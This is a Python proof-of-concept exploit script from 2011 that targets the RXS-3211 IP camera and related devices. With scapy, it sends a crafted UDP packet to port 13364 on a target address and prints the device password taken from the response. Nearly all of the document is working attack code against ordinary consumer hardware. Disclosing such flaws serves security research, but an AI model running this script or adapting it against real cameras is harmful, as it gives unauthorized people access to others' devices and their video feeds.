'''
Proof-of-concept that exploits a vuln in the RXS-3211 IP camera et al
by remotely retrieving the device password. Full list of possibly
supported devices availbled in reference. Should work everywhere.


Author: Ben Schmidt (supernothing)
Reference: http://spareclockcycles.org/exploiting-an-ip-camera-control-protocol/
Released: 05/23/2011
'''

from scapy.all import *
import sys

# Replace with \x00\x02\xff\xfd for broadcast response
# Note: response will be different, pass at offset 520
cmd = "\x00\x06\xff\xf9"

target_mac = "\xff\xff\xff\xff\xff\xff"

target_ip = sys.argv[1]

# Query device
ans = sr1(IP(dst=target_ip)/UDP(dport=13364)/(target_mac + cmd),timeout=5)

try:
    if ans != None and ans[Raw].load[6:10] == "\x01"+cmd[1:]:
        pw = ans[Raw].load[333:345]
        print "[+] Password: %s" % pw.strip("\x00")
    else:
        print "[-] Unable to grab password."
except:
    print ""
